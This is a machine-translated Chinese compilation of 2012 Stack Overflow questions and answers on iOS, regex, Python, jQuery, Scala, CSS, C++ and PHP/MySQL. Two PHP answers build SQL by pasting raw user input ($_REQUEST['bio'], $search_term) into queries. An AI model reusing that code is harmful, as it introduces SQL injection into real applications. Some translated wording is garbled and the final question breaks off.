我想我可以用`isKindOfClass`它来判断它是什么类型的控件，并相应地设置我的事件，但这似乎有点草率，我觉得应该有更直接的方法来做到这一点。我也可以设置一个 UITapGestureRecognizer 并以这种方式构建一些东西，但这仍然感觉像是一种解决方法，而不是它应该完成的方式。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:25:35.077

如果您愿意子类化，您可以覆盖`-resignFirstResponder`以检测丢失的“焦点”，并采取相应的行动。这可能仅对可以保存第一响应者状态的文本字段之类的东西有用，例如，它不起作用`UISwitch`。

由于所有 UIControl 对象都只是 UIViews，因此您还可以覆盖`touchesEnded`以检测与这些元素交互的结束。虽然更可接受的方式是将您的解除处理程序方法添加为所有`UIControlEvents`指示交互结束的操作，或者只是`UIControlEventValueChanged`.

Apple 文档中有关 UIResponder 的更多信息：

[https://developer.apple.com/library/ios/documentation/uikit/reference/UIResponder_Class/Reference/Reference.html#//apple_ref/occ/instm/UIResponder/resignFirstResponder](https://developer.apple.com/library/ios/documentation/uikit/reference/UIResponder_Class/Reference/Reference.html#//apple_ref/occ/instm/UIResponder/resignFirstResponder)

许多 UIKit 类都有指示交互何时结束的委托方法，例如`UITextField`有一个`textFieldDidEndEditing`方法。`UITextView`有类似的方法。

# c# - 正则表达式匹配短语中的单个单词

> ID：13167416
> 
> 赞同：2
> 
> 时间：2012-10-31T21:05:32.780
> 
> 标签：c#, regex

我正在使用正则表达式来执行站点搜索。如果我搜索这个：“Villas at Millwood”（这是一个社区名称）并且相应的社区名称是“Villas at Millwood”，我会得到结果。

如果我搜索“米尔伍德别墅”，则没有填充结果。

我的意思是，这句话被视为一个整体，并且匹配。有没有办法匹配输入短语中出现的单个单词？那么“米尔伍德别墅”仍然会带来“米尔伍德别墅”的结果吗？

这是我必须匹配社区名称的内容：

```
Regex.IsMatch(MarketingCommunityName.Trim(), pattern, RegexOptions.IgnoreCase) 
```

其中 pattern 是输入的搜索短语，MarketingCommunityName 是实际的社区名称。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:18:03.717

尽管我认为您应该`Split`将搜索模式放在一个空格处，然后分别检查每个单词，但从您的搜索模式构造一个与顺序无关的正则表达式并不难：

```
var searchWords = searchString.Trim().Split(new Char[] {' '});

string pattern = @"^(?=.*" + String.Join(@")(?=.*", searchWords) + ")"; 
```

这构造了一个正则表达式，每个搜索词包含一个前瞻断言。每个前瞻断言都从字符串的开头开始，并查看搜索词是否出现在字符串内的任何位置。请注意，如果您`searchString`包含正则表达式元字符，您可能会遇到问题，所以这些可能应该事先转义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:17:48.087

找到两种模式的正则表达式模式将是

```
\bMillwood\b.*\bvillas\b 
```

where`\b`表示单词的开头或结尾，`.*`代表任意数量的字符。

如果你不介意找词的一部分，你可以去掉`\b`'s

```
Millwood.*villas 
```

`"villas of Millwood"`但是，例如，您不会找到。这种模式将

```
Millwood.*villas|villas.*Millwood 
```

但是，如果您想将此搜索扩展到包含三个以上单词的模式，Regex 不是实现这种模糊逻辑的正确选择。我会计算不同的匹配词的数量并返回产生最小计数的短语。（可能至少有 60% 的给定单词。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T21:30:32.487

拆分短语并检查每个单词

```
pattern.Split(' ')
    .All(word=>Regex.IsMatch(MarketingCommunityName.Trim(), word, RegexOptions.IgnoreCase) 
```

# python - 使用 JSON 或 pickle 编码到使用 Python 的变量

> ID：13167418
> 
> 赞同：2
> 
> 时间：2012-10-31T21:05:41.640
> 
> 标签：python, python-3.x, encode, pickle

我知道可以使用将 Python 对象编码为文件

```
import pickle
pickle.dump(obj, file) 
```

或者您可以使用 JSON 进行几乎相同的操作，但问题是，这些都编码或解码为文件，是否可以将对象编码为字符串或字节**变量**而不是**文件**？

我在 Windows 上运行 Python 3.2。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:08:33.397

当然，只需使用[`pickle.dumps(obj)`](http://docs.python.org/2/library/pickle.html#pickle.dumps)or [`json.dumps(obj)`](http://docs.python.org/2/library/json.html#json.dumps)。

# jquery - 具有多个 img 尺寸的响应式 jQuery 幻灯片高度

> ID：13167420
> 
> 赞同：0
> 
> 时间：2012-10-31T21:05:47.350
> 
> 标签：jquery, css, slideshow, responsive-design

我让开发人员根据 960 像素的布局设计制作了幻灯片。现在，我正在创建一个响应式设计。我一直很难修复幻灯片加载功能。当您点击下一张图片时，幻灯片下方的内容会先向上滑动，然后再向下滑动。缓存图像时效果很好。

我尝试了很多东西，但是我的jQuery知识有点缺乏。有人有建议吗？您可以在以下汇编链接中找到代码和脚本： [https ://www.assembla.com/code/cfrepo/subversion/node/blob/trunk/index.html#image=JohnMerriam](https://www.assembla.com/code/cfrepo/subversion/node/blob/trunk/index.html#image=JohnMerriam)

[http://jsfiddle.net/doobada/HDyyk/](http://jsfiddle.net/doobada/HDyyk/)

我试图将#real_display li 高度设置为等于预加载的图像，但我无法弄清楚。我还尝试将#real_display li 高度设置为等于当前图像，然后隐藏 li，然后在加载图像后将 #real_display li 高度设置为 auto。

JS：

```
$('#real_display li:visible').hide(0); 

var customURL = window.location.href;

$('#info_box').remove();

$('#real_display').append('<div id="info_box"><ul id="social_buttons_box"></ul>'+
                                '<p>'+curr_obj["img_caption"]+'&nbsp;'+
                                '<a href="'+curr_obj["img_href"]+'">'+curr_obj["img_author"]+'</a></p></div>');

$('#social_buttons_box').hide();

setTimeout(function(){$('#social_buttons_box').fadeIn(500);}, 0);

var curr_dom_obj_li = $('#rimg_id_'+img_num);
var curr_dom_obj = curr_dom_obj_li.find('img');

if(curr_dom_obj.attr("src") == ""){
    curr_dom_obj.attr("src", curr_dom_obj.attr("link"));
}

curr_dom_obj_li.fadeIn(500); 
```

我被困住了，到处寻找答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:54:02.553

您可能只想使用 JQuery 预加载图像，而不是尝试确定下一个图像的大小并动态更改高度。一旦加载了您提到您满意的图像，这将为您提供您获得的效果。

[此处](https://stackoverflow.com/questions/476679/preloading-images-with-jquery)解释了使用 JQuery 预加载图像。

# javascript - 将字符串与新创建的布尔值列表进行比较，无需循环，

> ID：13167427
> 
> 赞同：0
> 
> 时间：2012-10-31T21:06:30.863
> 
> 标签：javascript, boolean

我在 javascript 中创建了一个新布尔值列表，属于不同语言的布尔值（true、false、verdadero、falso、ratt、fel 等......）

我已经这样做了：

```
var false_swedish = new Boolean("fel"); 
```

等等。

我正在尝试编写一个小型文本游戏作为一种拼图来学习（我是初学者），所以我被困在这里。现在我的目标是：由于我有一个包含 10 个新布尔值的列表，我如何将它们与字符串（用户使用 a 写入的内容`prompt`）进行比较？

我首先考虑创建一个包含所有新单词的数组，然后将它们与字符串进行比较，但这违背了将它们声明为新布尔值并确定用户输入是否为布尔值的意义，在这里我不是很感兴趣最终结果，但更多的是在做的过程中（正如我所说，只是一个学习练习）

我已经创建了一个检查变量是否为布尔值的函数，基本上使用：

```
if (value.constructor == Boolean ){
    return true; 
```

然后使用该函数向`method`String 添加一个新的`prototype`，所以我可以检查提供的字符串`prompt`。但当然，该函数是无用的，因为它假设变量可能是布尔值，而它们不是。它们总是字符串...

我是不是想把它复杂化太多了？

感谢您的任何想法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T23:28:11.693

是的，你试图让它复杂化太多。

`new Boolean("any string")`是无用的，因为对于任何非空字符串，结果变量都会为真。如果您的目标是检查用户是否输入`'true`，`'false'`最好的解决方案是将他的输入与`'true'`. 但是如果有很多可能的输入，你可以使用一个对象：

```
// this object contains every string value you want to include in your script defined by a number
var predefinedValues = {'true': 1, 'false': 0, 'verdadero':1, 'falso':0};
// i assume userInput contains user input
if(predefinedValues[userInput] == 1) {
    //true
}
else {
    //false or not found in array
} 
```

# scala - Squeryl 中的关系和外键

> ID：13167431
> 
> 赞同：0
> 
> 时间：2012-10-31T21:06:41.057
> 
> 标签：scala, orm, lift, squeryl

我使用 Scala、Squeryl 和 MySql 来构建一个 Web 应用程序。

我发现将简单数据保存为字符串或整数很容易。但是当我有对象之间的关系并且我需要使用外键时呢？在我的应用程序中，我有区域和子区域，它们的属性类型为区域（它们所属的区域），所以我的区域和子区域就像这些

```
 class Area(
            var idArea: String,

            @BeanProperty
            var name:String,
            @BeanProperty
            var letter: String,
            @BeanProperty
            var color: String
            )
  extends Idable {
  def this() = this("","", "","")

}

class SubArea(var idSubArea: String,
              @BeanProperty
              var name: String,

              @BeanProperty
              var area:Area

               ) extends Idable {

  def this() = this("","",null ) 
```

我如何定义架构，所以我的 SubArea 表有一个 Area id，我的 Area Table 的外键？目前我的 SubArea 架构是这样的

```
object SubAreaSchema extends Schema {

  val subAreas=table[SubArea]
  on(subAreas)(subArea => declare(
    subArea.id is (autoIncremented),
    subArea.name is (unique)
  ))
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T19:52:52.457

您可以在架构中定义关系：

```
val areaToSubAreas = oneToManyRelation(areas, subAreas).via((a,sA) => s.idArea === sa.areaId) 
```

为了使这项工作，您需要修改您的 SubArea 类直接加载外键的 id，如下所示`areaId:String`。

```
class SubArea(var idSubArea: String,
              @BeanProperty
              var name: String,

              @BeanProperty
              var areaId: String) 
```

然后在方法体中，如果你想访问对象，你可以使用：

```
 def area = areaToSubAreas.right(this) 
```

这将产生`ManyToOne[Area]`您查询的一个，或使用`headOption`on 转换为一个`Option[Area]`.

相反，如果您需要引用 上的子区域`Area`，您可以使用：

```
 def subAreas = areaToSubAreas.left(this) 
```

这将产生一个`OneToMany[Area]`可以迭代的，或者你也可以调用`toList`.

# ios - 将 xcode 4.5.1 项目移动到不同的文件夹

> ID：13167433
> 
> 赞同：1
> 
> 时间：2012-10-31T21:06:58.783
> 
> 标签：ios, xcode

我在 xcode 中创建了一个相当大的应用程序，并希望将文件移动到我计算机上的其他位置。

这个过程是否可以像将项目文件夹拖到 finder 中的不同位置一样简单，还是会出现问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-05T10:52:17.913

只要在迁移文件时关闭 xcode 并删除旧文件，移动 .xcodeproj 文件就不会导致任何问题。

下次启动 xcode 时，如果您从新目录浏览并打开 proj 文件，所有引用都将设置为正确的目标

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-11T19:30:26.353

作为另一个旁注，我只是试图这样做，但它对我来说搞砸了。通常，任何引用都会切换，但我有一个链接器错误：ld。它试图链接到旧文件夹中包含的外部库。我不得不去构建设置->搜索路径->库搜索路径并将其更改为新文件夹位置。这对我有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-14T16:03:46.233

附带说明一下，在迁移项目以避免问题时，将旧文件保存在 .old 文件夹中总是值得的。

只要文件保存在各自的文件夹中，下次您在 xcode 中运行构建时，对 proj 文件所在的新目录的引用就会更新。

# ios - 将数据传递给 UINavigationController 指向的视图控制器

> ID：13167434
> 
> 赞同：4
> 
> 时间：2012-10-31T21:06:59.730
> 
> 标签：ios, uinavigationcontroller

所以这是我的问题。我是一个无声的 stackoverflow skimmer，我使用 xcode 4.5 故事板作为一个应用程序，该应用程序以一个要求用户名和密码的视图控制器开始。我的应用程序通过后端服务器检查数据，然后如果登录正确，它会执行指向 uinavigationcontroller 的 segue，将屏幕转发到主菜单.... uinavigationcontroller 没有被篡改并自动推送主菜单。

```
Login_screen -> UINavigationController -> Main_Menu 
```

我的问题是如何将`NSString`用户名从登录屏幕传递到主菜单屏幕。

`prepareforsegue`我了解当 segue 通过方法直接指向它时如何将数据从一个屏幕传递到下一个屏幕`performsegue`。但在这种情况下，`login_screen`segue 指向`uinaviationcontroller`which 指向`main_menu controller`

我的假设是我需要创建一个自定义类来继承`UINavigationController`和实现某些方法，但由于`uinavigationcontroller`没有看到我不认为`viewdidload`或者`viewwillappear`是正确的方法。

任何帮助将不胜感激

我是新用户，所以我不能发布图片，但我会尽快解决这个问题

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-03T14:00:13.270

您可以使用 UINavigationController 的 topViewController 属性。

将 UINavigationController.topViewController 对象强制转换为 Main_MenuViewController 并正常设置数据。

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:34:40.770

在任何情况下，您都需要一些容器来保存当前选定/活动对象。如果由于某种原因您无法扩展 UINavigationController（我想知道为什么），您始终可以在 AppDelegate 中拥有一些可以分配的属性，并在最终的 Main_Menu 控制器中读取此属性。

像这样：

```
AppDelegate* app = (AppDelegate*)[[UIApplication sharedApplication] delegate];
NSObject* myThing = app.myObj
if(!myThing) {
    app.myObj = ...
} 
```

# css - 如何在覆盖窗口宽度百分比的流体 div 中并排显示两个具有不同高度/宽度比的图像，高度相等？

> ID：13167435
> 
> 赞同：1
> 
> 时间：2012-10-31T21:07:15.090
> 
> 标签：css, html, fluid-layout

我不确定我是否可以做到这一点，但这[是](https://stackoverflow.com/questions/3201230/how-to-shrink-a-div-around-a-scaled-img)如此接近，我无法想象这是不可能的。

我的目标是纯 CSS/HTML 解决方案。我希望两个具有不同高度的图像以相同的高度并排出现。我希望左边的图像覆盖 60% 的 div，右边的图像可以有剩余的 40%（我知道它的宽度会小于 40%，但不是它的确切宽度）。无论窗口大小如何，组合都应出现在覆盖窗口宽度 70% 的 div 中。[布局示例](https://imgur.com/5vim3) 两个图像都应保持其纵横比。左上图显示了一个带有未缩放图像的浏览器窗口，第二个是 div 覆盖了大约 60% 的窗口宽度，图像以相等的高度显示，并且无论浏览器窗口宽度如何，这些百分比都应该保持不变，如我试图在第三张和第四张图中显示。

我尝试了许多变化，但如果窗口变得太小，右图像通常会包裹在左图像下方，或者图像仅随窗口高度缩放，这绝对不是我想要的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T07:10:40.927

Kitting the beg borrow and steal together, I get this [working example](http://jsfiddle.net/Md2AN/):

```
<!DOCTYPE html>
<html>
    <head>
    <title>Stackoverflow Question</title>
        <style type="text/css">
            .aspectwrapper {
            display: inline-block; /* shrink to fit */
            width: 40%; /* whatever percentage of window's width you like */
            position: relative; /* so .content can use position: absolute */
            }
            .aspectwrapper::after {
            padding-top: 40%; /* play with this to fit both images in one line */
            display: block;
            content: '';
            }
            .content {
            position: absolute;
            top: 0; bottom: 0; right: 0; left: 0; /* follow the parent's edges */
            outline: thin dashed green; /* just so you can see the box */
            overflow: hidden;
            }
            .images {float: left;}
            img {width: auto;height: 100%;}        
        </style>
    </head>
    <body>
    <div class="aspectwrapper">
        <div class="content">
          <div class="images">                                
            <img src="img1.jpg" />
            <img src="img1.jpg" />
          </div>  
        </div>
    </div>
    </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T00:00:10.847

这是我的解决方案的一个简单示例，使用嵌入式样式表：

```
<!DOCTYPE html>

<html>
<head>
    <title>Stackoverflow Question</title>
    <style>
div {
   height: /*unfortunately cannot be a percentage*/ 200px;
   width: 70%;
}

img.leftimage {
   float: left;
   width: 60%;
   height: 100%;
}

img.rightimage {
   float: right;
   width: 40%;
   height: 100%;
}
    </style>
</head>
<body>
    <div>
        <img src="droids.jpg" class="rightimage" />
        <img src="WinZip.png" class="leftimage" />
    </div>
</body>
</html> 
```

[这](http://jsfiddle.net/CodeMonkey14/ULy46/4/)是一个使用颜色而不是图像的小提琴，如果重要的话，这些是我上面使用的图像 - 明显不同的高度/宽度比：

![机器人](../Images/92a140b0add63303dd1183eef2c24a5d.png) ![WinZip](../Images/910615791455a7487e94b60778ee4685.png)

# c++ - 函数指针语法歧义

> ID：13167437
> 
> 赞同：2
> 
> 时间：2012-10-31T21:07:24.820
> 
> 标签：c++

举个例子。我创建了一个名为 的函数指针`s`，将其设置为`f`并调用它。这当然编译得很好：

```
void f() {}

int main() {

    void (*s)();

    s = f;

    s();

} 
```

但是以下一个示例为例，我`s`现在将其声明为“函数引用”（如果它被称为）并设置为`f`内联。这也编译得很好：

```
void f() {}

int main() {

    void (&s)() = f;

    s();

} 
```

这两种创建和初始化函数指针的方法有什么区别？请注意，当我使用引用语法时，我需要将其“内联”初始化为，`f`而使用“指针”语法，我可以双向进行。你也能解释一下吗？有了这个，你能解释一下它们在可用性方面的区别是什么，我什么时候必须使用一种形式而不是另一种形式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:18:32.007

从根本上讲，跟注方没有明显区别。但是**decl**方面肯定会。正如您所指出的，引用必须初始化为引用*something*。这使它们“更安全”，但即使这样也不能保证“安全”。

函数指针根本不需要指向函数。它可能为 NULL，甚至未初始化（指向垃圾）。这并不重要，因为您以后可以随时更改它（这是您无法对引用进行的操作）。

```
void (*s)();  // uninitialized 
```

或者

```
void (*s)() = NULL; // set to null 
```

然后

```
void foo() 
{
}

s = foo; 
```

你不能做任何参考。*必须*将引用初始化为*一些东西*，并且最好是一些*有效*的东西：

```
void (&f)() = foo;   // ok. also references foo().
void (&f)() = *s;    // also ok, but wait, is s valid?? does it have to be?? 
```

然而，即使在这里，函数引用也不能保证是安全的，只是*更安全*。你当然可以这样做：

```
void (*s)();
void (&f)() = *s; 
```

你可能会得到一个编译器警告（我这样做，“在初始化之前使用”）但最后`f`仍然是对**根本不是**函数的“函数”的引用；只是指针中的随机堆栈垃圾`s`。更糟糕的是，因为无法重新分配引用。这东西*总是*指向垃圾。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T21:18:32.710

差异与任何指针/引用的差异相同。

引用必须初始化并且以后不能重新分配：

```
int i,j;
int &r = i;
r = j; // i = j, not &r == &j 
```

引用不能被视为与它们引用的对象不同的对象（与指针相反，指针是与它们指向的对象不同的对象）......

```
int i;
int *p = &i; // &p != &i
int &r = i;  // &r == &i 
```

使用函数指针在语法上看起来与使用引用相同，但这是因为函数指针的特殊规则允许您在不取消引用的情况下使用它们。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-31T21:19:15.317

您自己说过，不同之处在于，对于引用，您必须在声明时绑定它，这保证了引用始终引用有效对象。另一个区别是引用在声明后不能重新绑定，因此它们在整个生命周期中只引用一个对象。

除此之外，它们是相同的。我遇到了一些更喜欢引用的纯粹主义者，并说指针是不应该使用的 C 的遗迹。其他人更喜欢指针，因为他们更“明确”地说明它们是指针这一事实。

是否使用其中一种取决于您的需求。选择的方法是，尽可能使用引用，但如果您确实需要能够将其指向不同的函数，则使用指针。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-31T21:17:57.997

对类型 P 的引用很像指向类型 P 的 const 指针（而不是指向 const P 的指针，这是不同的）。

碰巧的是，如果您的类型 P 是函数类型，那么它们的大多数不同方式并不重要。& 的行为略有不同，您可以直接将指针分配给非 const 指针，并且采用一个的函数可能不会采用另一个。

如果类型 P 不是函数类型，则会有很多其他差​​异——operator=、临时对象的生命周期等。

简而言之，答案是“不多”。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-31T21:20:14.903

1.  函数标识符是函数类型的表达式，但它们隐式转换为函数指针类型或函数引用类型。因此它们可以传递给引用或指针的构造函数以及指针的 operator=。

2.  由于引用在语法上的行为类似于实例，因此无法对引用而不是被引用的对象进行操作。这就是为什么它们只能被初始化。顺便说一句，C++ 中的首选语法是带括号的，而不是`=`.

3.  您应该尽可能使用引用，并且仅当您不能使用引用时才使用指针。原因是由于很多事情不能做参考（指向 NULL、更改参考对象、删除它等），因此在阅读代码时需要查找的事情更少。`*`此外，它还节省了一些`&`字符。

# php - 当用户失去文本区域的焦点时更新mysql中的表？

> ID：13167438
> 
> 赞同：0
> 
> 时间：2012-10-31T21:07:25.607
> 
> 标签：php, javascript, mysql, ajax

我希望我网站的用户能够通过单击文本区域来更新他们的个人资料信息。当他们输入一些文本并单击文本区域（模糊）时，我希望它更新我的数据库中名为“bio”的表。

我已经为此工作了几天，我很惭愧地承认，但我对 php 和 sql 真的很陌生，所以我正在学习。我试图理解一个脚本，但它可能是完全错误的。有人可以告诉我我需要做什么吗？

这是我的代码：

```
 <textarea id="bio" style="width: 456px; 
    margin-top:3px;
    text-align:left;
    margin-left:-2px;
    height: 120px;
    resize: none; 
    border: hidden;" textarea name="bio" data-id="bio">
    <?php echo $profile['bio'] ?>
  </textarea>

  <script type="text/javascript">

    $('textarea').on('blur',function () {
        var bioVal = $(this).val(), 
            id = $(this).data('id');        

        $.ajax({
             type: "POST",
             url: "includes/changebio.php",
             data: {bio:bioVal , id:id},
             success: function(msg) {
                 $('#bio-' + id).val(msg);
             }
       })
    });

  </script> 
```

这是应该完成工作的url php文件：

```
function update_profilebio() {
            global $connection;
            global $profile_id;
            $query = "UPDATE ptb_profiles
                      SET bio=''
                        WHERE ptb_profiles.user_id = \"$profile_id\"
                        AND ptb_profiles.user_id = ptb_users.id";
            $update_profilebio_set = mysql_query($query, $connection);
            confirm_query($update_profilebio_set);
            return $update_profilebio_set;

            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T22:18:02.740

我检查了 HTML+JavaScript 代码，并且 AJAX POST 请求正在正确地将数据发送到 PHP 脚本（您可以在 Chrome 开发人员工具中或使用 Firebug 插件进行检查）。

这个 changebio.php 脚本只有这个 update_profilebio() 函数的定义？单独定义不会执行这个函数，你需要调用它。

```
<?php
    update_profilebio(); // tells php to call the function, defined below

    function update_profilebio() {
        global $connection;
        global $profile_id;
        $query = "UPDATE ptb_profiles
                  SET bio=''
                    WHERE ptb_profiles.user_id = \"$profile_id\"
                    AND ptb_profiles.user_id = ptb_users.id";
        $update_profilebio_set = mysql_query($query, $connection);
        confirm_query($update_profilebio_set);
        return $update_profilebio_set;
    } 
?> 
```

此外，SQL 查询有两个条件，我不明白这部分“...AND ptb_profiles.user_id = ptb_users.id”。您只更新一个表中的一列，您唯一需要的是您在第一个 where 条件中提供的用户 ID。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T22:25:58.570

您的 HTML + jQuery 代码看起来不错，只需`<?php echo $profile['bio'] ?>`添加cheng php 输出`htmlspecialchars`，这将帮助您避免一些麻烦

```
<?php echo htmlspecialchars($profile['bio']); ?> 
```

您的代码中失败的是 SQL 查询；您正在将 bio 设置为空文本。此外，您有与其他表 id 匹配的条件`user_id`，但您尚未在查询中加入此表。只需要`user_id`等于给定的整数就足够了。还要记住正确转义用户输入，以防止他们将恶意代码注入您的数据库。

SQL 应如下所示：

```
$bio = mysql_real_escape_string($_POST['bio']);

$query = "
UPDATE 
   ptb_profiles 
SET 
   bio='{$bio}'
WHERE
   ptb_profiles.user_id = " . intval($profile_id); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T22:18:11.457

你的引用错误，试试这样的

```
 $query = "UPDATE ptb_profiles SET bio='".$_REQUEST['bio']."'
           WHERE ptb_profiles.user_id = ".$profile_id; 
```

SQL 通常使用单引号，PHP 两者都使用。

# python - 解析python命令行参数

> ID：13167441
> 
> 赞同：0
> 
> 时间：2012-10-31T21:07:28.657
> 
> 标签：python

完成新手问题。

我正在开发一个使用 API 搜索电影数据库的类。

以下是在 Python 解释器中使用电影名称和年份进行查询的方法：

```
import moviesearch

movie_db = moviesearch.MovieSearch()
result = movie_db.search('Clockwork Orange', year='1971')
print result 
```

执行此特定查询会从我正在使用的服务中产生一个结果。

为了节省输入以进行测试，我创建了以下脚本 m.py：

```
from sys import argv
import moviesearch

script, movie_name, params = argv

movie_db = moviesearch.MovieSearch()
result = movie_db.search(movie_name, params)
print result 
```

当我像这样执行这个脚本时：

```
python m.py 'Clockwork Orange', year='1971' 
```

该服务产生两个结果。

所以这意味着当我用脚本测试类时，我格式化参数的方式有问题。有人可以告诉我我做错了什么吗？

我不包括用于查询电影数据库的类，因为我认为这对于找出问题所在没有必要。我需要知道的是如何在使用脚本时正确格式化我的参数，以便它完全按照上面示例中的方式执行，我直接从 Python 解释器使用类。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-31T21:14:35.020

当您在 shell 中执行此操作时（我假设 *nix 平台具有与 sh 兼容的 shell；Windows 可能略有不同）：

```
python m.py 'Clockwork Orange', year='1971' 
```

该`sys.argv`列表将是：

```
['m.py', 'Clockwork Orange,', 'year=1971'] 
```

所以，当你这样做时：

```
script, movie_name, params = argv 
```

您最终`movie_name`设置为字符串`'Clockwork Orange,'`（带有额外的逗号），并`params`设置为字符串`'year=1971'`。所以，你的电话最终是：

```
result = movie_db.search('Clockwork Orange,', 'year=1971') 
```

这与以下内容不同：

```
result = movie_db.search('Clockwork Orange', year='1971') 
```

那么，你如何得到你想要的？

好吧，您可以使用如下代码解析参数：

```
params = dict(pair.split('=') for pair in argv[2:])
result = movie_db.search(movie_name, **params) 
```

第一行会给你一个`dict`with `{'year': '1971'}`。然后，您可以使用`**`语法将其`dict`作为关键字参数转发给函数。

最后，您应该在用于运行脚本的参数中去掉多余的逗号。（您可以编写代码来删除它，但它似乎只是一个错字，所以更好的解决方法是不要打错字。）

# php - 如何让 wamp 显示每一个错误？

> ID：13167450
> 
> 赞同：2
> 
> 时间：2012-10-31T21:07:46.860
> 
> 标签：php, wamp, wampserver

我将我的网站从 wamp 本地服务器上传到网络主机。尽管我的本地 php.ini 设置为`error_reporting = E_ALL`，但当我在网络主机上上传页面时，它向我显示了 wamp 没有的错误，例如：

> “警告：session_start() [function.session-start]：无法发送会话 cookie - 标头已由...发送”

我的问题是，如果可能的话，我该如何设置我的 wamp 服务器来向我显示所有这些错误？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T21:14:09.887

E_ALL 将显示：

> “警告：session_start() [function.session-start]：无法发送会话 cookie - 标头已由...发送”

但是，如果在您的 php.ini 中您将输出缓冲设置为开启，而另一方面您将输出缓冲关闭，则可能会导致出现此类错误！

您想使用几乎相同的 php.ini 设置来配置两者（显然使用特定于服务器的设置，而不是不同的 tmp 路径等）。您真的不希望在生产服务器上使用 E_STRICT，因为它通常不会是错误，而是更多的建议。

**更新**

忘了提一下，您还需要`set display_errors = on`在 php.ini 中，但在生产中应该关闭并使用日志记录。有关解释所有错误设置的更多信息：[http ://www.phpknowhow.com/configuration/php-ini-error-settings/](http://www.phpknowhow.com/configuration/php-ini-error-settings/)

# mysql - 在表格的两列中按术语搜索并按计数排名

> ID：13167457
> 
> 赞同：0
> 
> 时间：2012-10-31T21:08:16.897
> 
> 标签：mysql, search

我有一个表 InnoDB，其中包含 id(int)、name(varchar) 和 info(text) 列。我需要使用给定的术语搜索表的名称和信息列，并根据每条记录组合的两列中的“命中”数从高到低排列匹配记录。

我已经搜索过了，但我以前从来没有用 MySQL 做过这样的事情，发现这一切有点令人困惑......大小写和匹配等等等。

谁能提供一些快速帮助？

这是据我所知：

```
SELECT count(*) as count
FROM artistmanager_artists WHERE
case when 'name' LIKE '%a%' then 1 else 0 end
+ case when 'info' LIKE '%a%' then 1 else 0 end
ORDER BY count ASC 
```

（“a”是搜索词）

它返回一行和一列，'count'，值为三......我猜这是因为我在 mo 的表中有三条记录？

我也发现并尝试了这个：

```
SELECT *
FROM `artistmanager_artists`
WHERE `name` LIKE '%a%'
AND (
   `info` LIKE '%a%'
)
ORDER BY (
  (
      CASE WHEN `name` LIKE '%a%'
      THEN 1
      ELSE 0
      END
  ) + (
     CASE WHEN `info` LIKE '%a%'
     THEN 1
     ELSE 0
     END
  )
) DESC 
```

这返回了除了一条记录之外的所有记录，没有明显的顺序，当我知道它没有返回的记录包含很多“a”时！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T00:46:20.700

Thw 以下将按与您的术语匹配的列数（0 到 2）对行进行排名：

```
SELECT (name LIKE '%a%') + (info LIKE '%a%') AS rnk
FROM artistmanager_artists
ORDER BY rnk DESC 
```

这利用了布尔值（如 的结果）`LIKE`在 MySQL 中由整数表示的事实，0 表示假，1 表示真。所以你可以简单地添加它们，不区分大小写。

如果您想查找多个计数，您可能必须编写一个循环遍历您的字符串的存储过程，因为没有计算匹配项的基本字符串函数。除非数据量真的很大，否则最好在应用程序中而不是在数据库服务器上计算这些计数。

您的第一个代码段仅返回任一列中包含 的行数`a`。这是因为`COUNT`它是一个聚合列，它（在没有 a 的情况下`GROUP BY`）会将所有行合并为一行。第二个片段将只选择`a`在*两*列中都有的行，因此排序号将始终为`2`，导致明显缺乏排序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T09:27:02.210

我已经做了！感谢@MvG 的启发。因为我的 PHP 比我的 MySQL 好得多，所以我通过执行以下操作解决了这个问题：（我正在使用 Codeignite btw）

```
public function get_artists_search($search_term)
{
    $artists = array();
    $query = $this->db->query('SELECT id, name, info, (name LIKE "%' . $search_term . '%") + (info LIKE "%' . $search_term . '%") AS rnk FROM artistmanager_artists ORDER BY rnk DESC');
    foreach ($query->result() as $row)
    {
        // returned rows have at least one occurence in at least one of the two columns, so values are 1 or 2
        $artists[$row->id]['name'] = $row->name;
        $artists[$row->id]['info'] = $row->info;
        $artists[$row->id]['score'] = 0;
    }
    // now foreach returned row find occurence values.
    foreach($artists AS $key=>$artist)
    {
        $score_name = substr_count(strtoupper($artist['name']), strtoupper($search_term));
        $score_info = substr_count(strtoupper($artist['info']), strtoupper($search_term));
        $artists[$key]['score'] = $score_name+$score_info;
        unset($artists[$key]['name']);
        unset($artists[$key]['info']);
    }
    arsort($artists);
} 
```

它返回一个数组，其中记录的 id 作为键和排名值，从高到低排序。我测试了它并且它有效，所以我很高兴。

感谢大家对横向思维的帮助！

# bash - 尝试使用 Bash 脚本根据名称和日期移动文件夹

> ID：13167458
> 
> 赞同：-2
> 
> 时间：2012-10-31T21:08:19.243
> 
> 标签：bash

